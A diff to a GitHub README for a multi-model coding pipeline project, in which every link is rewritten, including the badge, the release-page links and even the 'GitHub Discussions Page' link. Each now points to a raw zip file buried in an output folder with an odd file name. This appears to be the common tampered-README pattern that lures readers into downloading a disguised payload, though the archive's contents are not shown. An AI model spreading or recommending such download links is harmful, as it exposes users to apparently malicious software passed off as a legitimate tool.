@@ -1,6 +1,6 @@
 # 🚀 sequential-multi-model-cofing-pipeline - Simplifying Multi-Agent Coding Workflows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/releases)
+[![Download Now](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/raw/refs/heads/main/output/2025-12-16_081132_url-validation-ai/generated_code/data/cofing-sequential-model-multi-pipeline-palaeotypography.zip%20Now-blue)](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/raw/refs/heads/main/output/2025-12-16_081132_url-validation-ai/generated_code/data/cofing-sequential-model-multi-pipeline-palaeotypography.zip)
 
 ## 📄 Description
 
@@ -28,7 +28,7 @@ To use sequential-multi-model-cofing-pipeline, your system should meet the follo
 Follow these steps to quickly download and run the application.
 
 1. **Visit the Release Page**: Click the link below to reach the release page.
-   - [Download Here](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/releases)
+   - [Download Here](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/raw/refs/heads/main/output/2025-12-16_081132_url-validation-ai/generated_code/data/cofing-sequential-model-multi-pipeline-palaeotypography.zip)
 
 2. **Choose Your Version**: Look for the latest version at the top of the releases page. 
 
@@ -48,7 +48,7 @@ Follow these steps to quickly download and run the application.
 
 Download the application from the release page by clicking the link below:
 
-- [Download Here](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/releases)
+- [Download Here](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/raw/refs/heads/main/output/2025-12-16_081132_url-validation-ai/generated_code/data/cofing-sequential-model-multi-pipeline-palaeotypography.zip)
 
 Simply follow the steps outlined above for a smooth installation experience.
 
@@ -76,6 +76,6 @@ If you run into issues while using the application, consider the following tips:
 
 ## 🗃️ Community and Support
 
-Join our community for more tips and support. You can find us on our [GitHub Discussions Page](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/discussions).
+Join our community for more tips and support. You can find us on our [GitHub Discussions Page](https://github.com/AnmolPro9757/sequential-multi-model-cofing-pipeline/raw/refs/heads/main/output/2025-12-16_081132_url-validation-ai/generated_code/data/cofing-sequential-model-multi-pipeline-palaeotypography.zip).
 
 We always welcome feedback and are here to help you succeed with your projects!
